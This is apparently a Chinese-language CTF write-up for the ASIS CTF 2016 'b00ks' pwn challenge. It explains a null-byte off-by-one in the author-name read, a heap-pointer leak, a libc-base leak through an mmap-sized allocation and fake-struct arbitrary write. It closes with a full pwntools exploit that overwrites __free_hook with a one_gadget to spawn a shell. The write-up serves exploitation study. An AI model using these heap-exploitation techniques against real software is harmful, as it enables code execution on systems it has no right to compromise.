# Asis CTF 2016 b00ks

## 漏洞

![](https://github.com/zh1x1an/pwn_ctf_wiki/raw/main/b00k/img/1_b00ks.jpg)

`my_read` 函数存在 null byte off-by-one ，可以先 read author name 为 32 个字节，然后创建一个 book，即可覆盖掉 author name 末尾的 `\x00`，然后打印就可以得到一个堆指针。

![](https://github.com/zh1x1an/pwn_ctf_wiki/raw/main/b00k/img/2_b00ks.jpg)

ida 里面可以看出，该 read 功能在 edit，create，change author name 都有用到。

## 漏洞利用

![](https://github.com/zh1x1an/pwn_ctf_wiki/raw/main/b00k/img/3_b00ks.jpg)

`author_name` 和 `struct_array_ptr` 都存储在 bss 段，且 `author_name` 在 `struct_array_ptr` 低地址处并存在 off-by-one 漏洞。可以利用该漏洞将 `stru1_ptr` 低位覆盖为0，指向第地址处我们可控的区域（右侧 heap 图中 `des_1` 的黄色 data 区域）

正常的 struct ptr 如 `stru2_ptr` 指向的结构为：


| id       | Name2_ptr |
|----------|-----------|
| Des2_ptr | Size      |

所以我们在 `des_1` 中伪造如上结构即可。

- leak libc

程序 malloc 申请 des 的大小并没有限制，所以可以申请 0x21000 大小的堆块，迫使 heap 通过 mmap 进行拓展。mmap 会单独映射一块内存。而 mmap 分配的内存与 libc 的偏移是固定的，因此可以推算出 `libc_base`。

```python
name1_size = 140
des1_size = 140
create_book(name1_size,"a"*name1_size,des1_size,"b"*des1_size)
create_book(0x21000,"c"*8,0x21000,"d"*8)
```

![](https://github.com/zh1x1an/pwn_ctf_wiki/raw/main/b00k/img/4_b00ks.jpg)

此时 `struct_ptr1` 为 0x0000555555758160，如果用 change author name 的 off-by-one 漏洞，既可覆盖为 0x0000555555758100，但是需要在 0x0000555555758100 的地址处提前布置伪造的结构如下：


| id = 1      | Name2_ptr = book1_ptr+0x38 |
|----------|-----------|
| Des2_ptr = book1_ptr+0x38| Size = 0xffff     |

## 调试

环境为 ubuntu16.04，关闭 aslr 后：

- 打印堆结构指令：

```shell
x/64gx 0x555555758010
```

![](https://github.com/zh1x1an/pwn_ctf_wiki/raw/main/b00k/img/5_b00ks.jpg)

- 打印 bss 段存储的 `author_name` 和 `stru_ptr`

```shell
x/18gx 0x555555756060-0x30
```

![](https://github.com/zh1x1an/pwn_ctf_wiki/raw/main/b00k/img/6_b00ks.jpg)

### 泄漏 book1 指针地址

先 change author name 为 32 个字符，然后再 create 一个 book1，使得 book1 的指针和 author name 之间没有 \x00。然后使用 print 功能，直接打印出 book1 在堆上的地址即可。

```python
changename("a"*32)
create_book(140,"aaaa",140,"aaab")
book_id_1, book_name, book_des, book_author = printbook(1)
```

### 覆盖 book1 struct 的低位

已经创建出 book1 后，再次 change author name，就会覆盖掉 book1 指针最低一个字节为 \x00，使其指向更低的地址。在内存中我们可控 book1 的 description，如果让 book1 的指针指向 book1 的 description，并且提前在 description 中伪造一个 book struct 的结构，就可以任意地址写了。

## 完整 exp

```python
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./b00ks"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)
context.arch = "amd64"
p.sendlineafter("Enter author name: ","a"*31+"t")

def create_book(size,book_name,description_size,book_description):
    p.sendlineafter("> ","1")
    p.sendlineafter("Enter book name size: ",str(size))
    p.sendlineafter("Enter book name (Max 32 chars): ",str(book_name))
    p.sendlineafter("Enter book description size: ",str(description_size))
    p.sendlineafter("Enter book description: ",str(book_description))

def print_book():
    p.sendlineafter("> ","4")

def edit_book(idx,description):
    p.sendlineafter("> ","3")
    p.sendlineafter("Enter the book id you want to edit: ",str(idx))
    p.sendlineafter("Enter new book description: ",str(description))

def changename(name):
    p.sendlineafter("> ","5")
    p.sendlineafter("Enter author name: ",str(name))

def printbook(id):
    p.readuntil("> ")
    p.sendline("4")
    p.readuntil(": ")
    for i in range(id):
        book_id = int(p.readline()[:-1])
        p.readuntil(": ")
        book_name = p.readline()[:-1]
        p.readuntil(": ")
        book_des = p.readline()[:-1]
        p.readuntil(": ")
        book_author = p.readline()[:-1]
    return book_id, book_name, book_des, book_author

def deletebook(book_id):
    p.readuntil("> ")
    p.sendline("2")
    p.readuntil(": ")
    p.sendline(str(book_id))

# leak book1 addr
create_book(140,"aaaa",140,"aaab")
create_book(0x21000, "cccc", 0x21000,"dddd") # mmap ,so only "cccc" and "dddd" on the heap
book_id_1, book_name, book_des, book_author = printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,'\0'))
log.success("book1_addr is "+hex(book1_addr))

# fake object
payload = "A"*0x40 + p64(0x1) + p64(book1_addr + 0x38) * 2 + p64(0xffff) #fake obj
edit_book(1,payload)
changename("a"*32)
# leak libc base
book_id_1, book_name, book_des, book_author = printbook(1)
call_back = u64(book_name.ljust(8,"\0"))
offset = 0x5ab010
libc_base = call_back - offset
log.success("libc_base is ->" + hex(libc_base))

# get shell
free_hook = libc_base + libc.sym["__free_hook"]
log.success("__free_hook is ->" + hex(free_hook))
# one_offset = 0x45226
one_offset = 0x4527a
# one_offset = 0xf0364
# one_offset = 0xf1207
one_gadget = libc_base + one_offset
log.success("one_gadget is ->" + hex(one_gadget))
gdb.attach(p)
edit_book(1, p64(free_hook) * 2)
edit_book(2, p64(one_gadget))
deletebook(2)

# gdb.attach(p)
p.interactive()
```
